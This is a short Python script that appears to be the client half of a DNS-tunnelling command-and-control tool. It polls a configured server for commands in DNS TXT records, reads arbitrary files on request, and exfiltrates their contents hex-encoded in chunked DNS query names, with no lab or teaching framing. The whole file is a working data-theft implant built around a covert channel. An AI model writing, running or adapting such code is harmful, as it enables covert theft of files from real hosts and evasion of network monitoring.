import yaml

import socket
import time
from dnslib import DNSRecord, DNSHeader, RR, QTYPE, A, TXT

with open('config.yaml', 'r') as configFile:
    configStruct = yaml.safe_load(configFile)

client_id = "client1"
server_ip = configStruct["server"]["ip"]
server_port = configStruct["server"]["port"]

def poll():
    domain = f"poll.{client_id}.tunnel"
    request = DNSRecord.question(domain, qtype="TXT")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(request.pack(), (server_ip, server_port))
    response_data, _ = sock.recvfrom(512)
    response = DNSRecord.parse(response_data)
    return str(response.rr[0].rdata).strip('"')

def execute(cmd):
    if cmd.startswith("read_file:"):
        path = cmd.split(":", 1)[1]
        try:
            with open(path, "r") as f:
                return f.read()
        except Exception as e:
            return f"ERROR: {e}"
    return "Unknown command"

def send_back(data):
    hex_data = data.encode().hex()
    chunks = [hex_data[i:i+50] for i in range(0, len(hex_data), 50)]
    for chunk in chunks:
        domain = f"{chunk}.{client_id}.tunnel"
        request = DNSRecord.question(domain, qtype="TXT")
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(request.pack(), (server_ip, server_port))
        time.sleep(0.5)

while True:
    cmd = poll()
    print(f"Befehl empfangen: {cmd}")
    if cmd != "noop":
        result = execute(cmd)
        send_back(result)
    time.sleep(5)